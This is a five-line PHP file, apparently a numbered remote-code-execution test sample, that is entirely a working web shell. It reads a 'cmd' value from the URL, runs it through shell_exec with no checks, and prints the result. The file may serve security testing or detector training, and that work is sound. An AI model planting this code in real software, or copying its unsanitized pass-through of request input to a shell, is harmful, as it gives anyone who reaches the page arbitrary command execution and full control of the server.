<?php
// RCE test variation #1045
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>